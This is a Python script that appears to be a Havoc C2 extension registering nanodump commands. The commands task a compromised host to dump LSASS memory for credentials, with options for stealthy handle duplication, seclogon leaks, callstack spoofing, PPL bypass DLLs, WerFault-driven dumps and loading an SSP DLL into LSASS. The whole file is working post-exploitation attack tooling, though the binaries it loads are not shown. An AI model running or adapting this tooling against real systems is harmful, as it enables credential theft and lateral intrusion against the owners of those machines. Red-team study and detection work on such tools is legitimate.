from havoc import Demon, RegisterCommand
import re
import time

def is_full_path(path):
    return re.match(r'^[a-zA-Z]:\\', path) is not None

def nanodump_parse_params(demon, params):
    packer = Packer()

    num_params = len(params)
    get_pid = False
    use_valid_sig = False
    write_file = False
    dump_path = ''
    pid = 0
    fork = False
    snapshot = False
    dup = False
    elevate_handle = False
    duplicate_elevate = False
    use_seclogon_leak_local = False
    use_seclogon_leak_remote = False
    seclogon_leak_remote_binary = ''
    use_silent_process_exit = False
    silent_process_exit = ''
    use_lsass_shtinkering = False
    use_seclogon_duplicate = False
    spoof_callstack = False

    skip = False
    for i in range(num_params):
        if skip:
            skip = False
            continue
        param = params[i]
        if param == '--getpid':
            # get the PID of LSASS and leave
            get_pid = True
        elif param == '--valid' or param == '-v':
            # use a valid signature for the minidump
            use_valid_sig = True
        elif param == '--write' or param == '-w':
            # set the path where the minidump will be written to disk
            write_file = True
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
                return None
            dump_path = params[i + 1]
        elif param == '--pid' or param == '-p':
            # set the PID of LSASS
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --pid value" )
                return None
            try:
                pid = int(params[i + 1])
            except Exception as e:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid PID: {params[i]}" )
                return None
        elif param == '--fork' or param == '-f':
            # set arg to true for process forking
            fork = True
        elif param == '--snapshot' or param == '-s':
            # set arg to true for process snapshot
            snapshot = True
        elif param == '--duplicate' or param == '-d':
            # set arg to true for handle duplication
            dup = True
        elif param == "--elevate-handle" or param == "-eh":
            # set arg to true for elevate handle
            elevate_handle = True
        elif param == "--duplicate-elevate" or param == "-de":
            # set arg to true for duplicate_elevate handle
            duplicate_elevate = True
        elif param == "--seclogon-leak-local" or param == "-sll":
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "sorry, --seclogon-leak-local is not supported right now" )
            return None
            # use MalSecLogon leak local
            use_seclogon_leak_local = True
        elif param == "--seclogon-leak-remote" or param == "-slr":
            # use MalSecLogon leak remote
            use_seclogon_leak_remote = True
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --seclogon-leak-remote value" )
                return None
            # decoy binary path
            seclogon_leak_remote_binary = params[i + 1]
            if is_full_path(seclogon_leak_remote_binary) is False:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You must provide a full path: {seclogon_leak_remote_binary}" )
                return None
        elif param == "--silent-process-exit" or param == "-spe":
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --silent-process-exit value" )
                return None
            use_silent_process_exit = True
            silent_process_exit = params[i + 1]
        elif param == "--shtinkering" or param == "-sk":
            # TODO: check if the user is system
            #user = beacon_info($1, "user" );
            #if user != "SYSTEM *":
            #    demon.ConsoleWrite( demon.CONSOLE_ERROR, "You must be SYSTEM to run the Shtinkering technique" )
            #    return None
            use_lsass_shtinkering = True
        elif param == "--seclogon-duplicate" or param == "-sd":
            # use the seclogon race condition to dup an LSASS handle
            use_seclogon_duplicate = True
        elif param == "--spoof-callstack" or param == "-sc":
            spoof_callstack = True
        elif param == "--help" or param == "-h":
            demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump [--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\Windows\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Dumpfile options:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write DUMP_PATH, -w DUMP_PATH" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            filename of the dump" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --valid, -v" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            create a dump with a valid signature" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Obtain an LSASS handle via:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --duplicate, -d" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            duplicate a high privileged existing LSASS handle" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --duplicate-elevate, -de" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            duplicate a low privileged existing LSASS handle and then elevate it" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --seclogon-leak-local, -sll" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            leak an LSASS handle into nanodump via seclogon" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --seclogon-leak-remote BIN_PATH, -slt BIN_PATH" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            leak an LSASS handle into another process via seclogon and duplicate it" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --seclogon-duplicate, -sd" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            make seclogon open a handle to LSASS and duplicate it" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --spoof-callstack {svchost,wmi,rpc}, -sc {svchost,wmi,rpc}" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            open a handle to LSASS using a fake calling stack" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Let WerFault.exe (instead of nanodump) create the dump" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --silent-process-exit DUMP_FOLDER, -spe DUMP_FOLDER" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            force WerFault.exe to dump LSASS via SilentProcessExit" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --shtinkering, -sk" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            force WerFault.exe to dump LSASS via Shtinkering" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Avoid reading LSASS directly:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --fork, -f" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            fork the target process before dumping" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --snapshot, -s" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            snapshot the target process before dumping" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Avoid opening a handle with high privileges:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --elevate-handle, -eh" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            open a handle to LSASS with low privileges and duplicate it to gain higher privileges" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Miscellaneous:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --getpid" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            print the PID of LSASS and leave" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
            return None
        else:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
            return None

    if write_file is False:
        dump_path = f'{int(time.time())}_lsass.dmp'

    if get_pid and \
        (write_file or use_valid_sig or snapshot or fork or elevate_handle or duplicate_elevate or
         use_seclogon_duplicate or spoof_callstack or use_seclogon_leak_local or
         use_seclogon_leak_remote or dup or use_silent_process_exit or use_lsass_shtinkering):
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The parameter --getpid is used alone" )
        return None

    if use_silent_process_exit and \
        (write_file or use_valid_sig or snapshot or fork or elevate_handle or duplicate_elevate or
         use_seclogon_duplicate or spoof_callstack or use_seclogon_leak_local or
         use_seclogon_leak_remote or dup or use_lsass_shtinkering):
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The parameter --silent-process-exit is used alone" )
        return None

    if fork and snapshot:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --fork and --snapshot cannot be used together" )
        return None

    if dup and elevate_handle:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --elevate-handle cannot be used together" )
        return None

    if duplicate_elevate and spoof_callstack:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --spoof-callstack cannot be used together" )
        return None

    if dup and spoof_callstack:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --spoof-callstack cannot be used together" )
        return None

    if dup and use_seclogon_duplicate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --seclogon-duplicate cannot be used together" )
        return None

    if elevate_handle and duplicate_elevate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --duplicate-elevate cannot be used together" )
        return None

    if duplicate_elevate and dup:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --duplicate cannot be used together" )
        return None

    if duplicate_elevate and use_seclogon_duplicate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --seclogon-duplicate cannot be used together" )
        return None

    if elevate_handle and use_seclogon_duplicate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --seclogon-duplicate cannot be used together" )
        return None

    if dup and use_seclogon_leak_local:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --seclogon-leak-local cannot be used together" )
        return None

    if duplicate_elevate and use_seclogon_leak_local:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --seclogon-leak-local cannot be used together" )
        return None

    if elevate_handle and use_seclogon_leak_local:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --seclogon-leak-local cannot be used together" )
        return None

    if dup and use_seclogon_leak_remote:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate and --seclogon-leak-remote cannot be used together" )
        return None

    if duplicate_elevate and use_seclogon_leak_remote:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --duplicate-elevate and --seclogon-leak-remote cannot be used together" )
        return None

    if elevate_handle and use_seclogon_leak_remote:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --elevate-handle and --seclogon-leak-remote cannot be used together" )
        return None

    if use_seclogon_leak_local and use_seclogon_leak_remote:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-local and --seclogon-leak-remote cannot be used together" )
        return None

    if use_seclogon_leak_local and use_seclogon_duplicate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-local and --seclogon-duplicate cannot be used together" )
        return None

    if use_seclogon_leak_local and spoof_callstack:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-local and --spoof-callstack cannot be used together" )
        return None

    if use_seclogon_leak_remote and use_seclogon_duplicate:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-remote and --seclogon-duplicate cannot be used together" )
        return None

    if use_seclogon_leak_remote and spoof_callstack:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-leak-remote and --spoof-callstack cannot be used together" )
        return None

    if use_seclogon_duplicate and spoof_callstack:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --seclogon-duplicate and --spoof-callstack cannot be used together" )
        return None

    if use_lsass_shtinkering is False and use_seclogon_leak_local and write_file is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "If --seclogon-leak-local is being used, you need to provide the dump path with --write" )
        return None

    if use_lsass_shtinkering is False and use_seclogon_leak_local and is_full_path(dump_path) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"If --seclogon-leak-local is being used, you need to provide the full path: {dump_path}" )
        return None

    if use_lsass_shtinkering and fork:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --fork cannot be used together" )
        return None

    if use_lsass_shtinkering and snapshot:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --snapshot cannot be used together" )
        return None

    if use_lsass_shtinkering and use_valid_sig:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --valid cannot be used together" )
        return None

    if use_lsass_shtinkering and write_file:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "The options --shtinkering and --write cannot be used together" )
        return None

    """
    if use_seclogon_leak_local:
        folder = "C:\\Windows\\Temp";
        seclogon_leak_remote_binary = folder . "\\" .  generate_rand_string(5, 10) . ".exe";
        # read in the EXE file
        handle = openf(script_resource("bin/nanodump." . barch . ".exe" ))
        exe = readb(handle, -1)
        closef(handle)
        if len(exe) == 0:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read exe file" )
            return

        # upload the nanodump binary
        bupload_raw(1, seclogon_leak_remote_binary, exe)
    """

    packer.adduint32(pid)
    packer.addstr(dump_path)
    packer.addbool(write_file)
    packer.addbool(use_valid_sig)
    packer.addbool(fork)
    packer.addbool(snapshot)
    packer.addbool(dup)
    packer.addbool(elevate_handle)
    packer.addbool(duplicate_elevate)
    packer.addbool(get_pid)
    packer.addbool(use_seclogon_leak_local)
    packer.addbool(use_seclogon_leak_remote)
    packer.addstr(seclogon_leak_remote_binary)
    packer.addbool(use_seclogon_duplicate)
    packer.addbool(spoof_callstack)
    packer.addbool(use_silent_process_exit)
    packer.addstr(silent_process_exit)
    packer.addbool(use_lsass_shtinkering)

    return packer.getbuffer()

def nanodump(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None

    demon = Demon( demonID )

    if demon.OSArch.startswith(demon.ProcessArch) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support WoW64" )
        return False

    packed_params = nanodump_parse_params(demon, params)
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute nanodump BOF" )

    demon.InlineExecute( TaskID, "go", f"bin/nanodump.{demon.ProcessArch}.o", packed_params, False )

    return TaskID

def nanodump_ppl_dump_parse_params(demon, params):
    packer = Packer()

    num_params = len(params)
    use_valid_sig = False
    write_file = False
    dump_path = ''
    dup = False

    with open(f'bin/nanodump_ppl_dump.{demon.ProcessArch}.dll', 'rb') as f:
        dll = f.read()
    if len(dll) == 0:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read dll file" )
        return None

    skip = False
    for i in range(num_params):
        if skip:
            skip = False
            continue
        param = params[i]
        if param == '--valid' or param == '-v':
            # use a valid signature for the minidump
            use_valid_sig = True
        elif param == '--write' or param == '-w':
            # set the path where the minidump will be written to disk
            write_file = True
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
                return None
            dump_path = params[i + 1]
        elif param == '--duplicate' or param == '-d':
            # set arg to true for handle duplication
            dup = True
        elif param == "--help" or param == "-h":
            demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump_ppl_dump --write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Dumpfile options:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write DUMP_PATH, -w DUMP_PATH" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            filename of the dump" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --valid, -v" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            create a dump with a valid signature" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Obtain an LSASS handle via:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --duplicate, -d" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            duplicate an existing LSASS handle" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
            return None
        else:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
            return None

    if write_file is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameter: --write" )
        return None

    if is_full_path(dump_path) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {dump_path}" )
        return None

    packer.addstr(dump_path)
    packer.addbool(use_valid_sig)
    packer.addbool(dup)
    packer.addbytes(dll)

    return packer.getbuffer()

def nanodump_ppl_dump(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None

    demon = Demon( demonID )

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support x86" )
        return False

    if demon.OSArch.startswith(demon.ProcessArch) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support WoW64" )
        return False

    packed_params = nanodump_ppl_dump_parse_params(demon, params)
    if packed_params is None:
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute nanodump_ppl_dump BOF" )

    demon.InlineExecute( TaskID, "go", f"bin/nanodump_ppl_dump.{demon.ProcessArch}.o", packed_params, False )

    return TaskID

def nanodump_ppl_medic(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()

    num_params = len(params)
    use_valid_sig = False
    write_file = False
    dump_path = ''
    elevate_handle = False

    demon = Demon( demonID )

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support x86" )
        return False

    if demon.OSArch.startswith(demon.ProcessArch) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support WoW64" )
        return False

    with open(f'bin/nanodump_ppl_medic.{demon.ProcessArch}.dll', 'rb') as f:
        dll = f.read()
    if len(dll) == 0:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read dll file" )
        return False

    skip = False
    for i in range(num_params):
        if skip:
            skip = False
            continue
        param = params[i]
        if param == '--valid' or param == '-v':
            # use a valid signature for the minidump
            use_valid_sig = True
        elif param == '--write' or param == '-w':
            # set the path where the minidump will be written to disk
            write_file = True
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
                return False
            dump_path = params[i + 1]
        elif param == '--elevate-handle' or param == '-d':
            # set arg to true for handle elevation
            elevate_handle = True
        elif param == "--help" or param == "-h":
            demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump_ppl_medic --write C:\\Windows\\Temp\\doc.docx [--valid] [--elevate-handle] [--help]" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Dumpfile options:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write DUMP_PATH, -w DUMP_PATH" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            filename of the dump" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --valid, -v" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            create a dump with a valid signature" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Avoid opening a handle with high privileges:")
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --elevate-handle, -eh" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            open a handle to LSASS with low privileges and duplicate it to gain higher privileges" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
            return False
        else:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
            return False

    if write_file is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameter: --write" )
        return False

    if is_full_path(dump_path) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {dump_path}" )
        return False

    packer.addbytes(dll)
    packer.addstr(dump_path)
    packer.addbool(use_valid_sig)
    packer.addbool(elevate_handle)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute nanodump_ppl_medic BOF" )

    demon.InlineExecute( TaskID, "go", f"bin/nanodump_ppl_medic.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

def nanodump_ssp(demonID, *params):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()

    num_params = len(params)
    nanodump_ssp_dll = b''
    write_dll_path = ''
    load_path = ''
    dump_path = ''
    use_valid_sig = False
    write_file = False

    demon = Demon( demonID )

    if demon.ProcessArch == "x86":
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support x86" )
        return False

    if demon.OSArch.startswith(demon.ProcessArch) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Nanodump does not support WoW64" )
        return False

    skip = False
    for i in range(num_params):
        if skip:
            skip = False
            continue
        param = params[i]
        if param == '--valid' or param == '-v':
            # use a valid signature for the minidump
            use_valid_sig = True
        elif param == '--write' or param == '-w':
            # set the path where the minidump will be written to disk
            write_file = True
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write value" )
                return False
            dump_path = params[i + 1]
        elif param == '--write-dll' or param == '-wdll':
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --write-dll value" )
                return False
            write_dll_path = params[i + 1]
        elif param == '--load-dll' or param == '-ldll':
            skip = True
            if i + 1 >= num_params:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "missing --load-dll value" )
                return False
            load_path = params[i + 1]
        elif param == "--help" or param == "-h":
            demon.ConsoleWrite( demon.CONSOLE_INFO, "usage: nanodump_ssp --write C:\\Windows\\Temp\\doc.docx [--valid] [--write-dll C:\\Windows\\Temp\\ssp.dll] [--load-dll C:\\Windows\\Temp\\ssp.dll] [--help]" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Dumpfile options:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write DUMP_PATH, -w DUMP_PATH" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            filename of the dump" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --valid, -v" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            create a dump with a valid signature" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "SSP DLL options:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --write-dll, -wdll" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            path where to write the SSP DLL from nanodump (randomly generated if not defined)" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --load-dll, -ldll" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            load an existing SSP DLL" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "Help:" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "    --help, -h" )
            demon.ConsoleWrite( demon.CONSOLE_INFO, "            print this help message and leave" )
            return False
        else:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"invalid argument: {param}" )
            return False

    if write_file is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Missing parameter: --write" )
        return False

    if is_full_path(dump_path) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {dump_path}" )
        return False

    if load_path != '' and write_dll_path != '':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"The options --write-dll and --load-dll cannot be used together" )
        return False

    if load_path != '' and is_full_path(load_path) is False:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"You need to provide the full path: {load_path}" )
        return False

    if load_path == '':
        with open(f'bin/nanodump_ssp.{demon.ProcessArch}.dll', 'rb') as f:
            nanodump_ssp_dll = f.read()
        if len(nanodump_ssp_dll) == 0:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "could not read dll file" )
            return False

    packer.addbytes(nanodump_ssp_dll)
    packer.addstr(write_dll_path)
    packer.addstr(load_path)
    packer.addstr(dump_path)
    packer.addbool(use_valid_sig)

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute nanodump_ssp BOF" )

    demon.InlineExecute( TaskID, "go", f"bin/nanodump_ssp.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( nanodump, "", "nanodump", "Dump the LSASS process", 0, "[--write C:\\Windows\\Temp\\doc.docx] [--valid] [--duplicate] [--elevate-handle] [--duplicate-elevate] [--seclogon-leak-local] [--seclogon-leak-remote C:\\Windows\\notepad.exe] [--seclogon-duplicate] [--spoof-callstack svchost] [--silent-process-exit C:\\Windows\\Temp] [--shtinkering] [--fork] [--snapshot] [--getpid] [--help]", "-w c:\\windows\\Temp\\test.txt" )
RegisterCommand( nanodump_ppl_dump, "", "nanodump_ppl_dump", "Bypass PPL and dump LSASS", 0, "--write C:\\Windows\\Temp\\doc.docx [--valid] [--duplicate] [--help]", "-w c:\\windows\\Temp\\test.txt" )
RegisterCommand( nanodump_ppl_medic, "", "nanodump_ppl_medic", "Bypass PPL and dump LSASS", 0, "--write C:\\Windows\\Temp\\doc.docx [--valid] [--elevate-handle] [--help]", "-w c:\\windows\\Temp\\test.txt" )
RegisterCommand( nanodump_ssp, "", "nanodump_ssp", "Load a Security Support Provider (SSP) into LSASS", 0, "--write C:\\Windows\\Temp\\doc.docx [--valid] [--write-dll C:\\Windows\\Temp\\ssp.dll] [--load-dll C:\\Windows\\Temp\\ssp.dll] [--help]", "-w C:\\Windows\\Temp\\test.txt" )
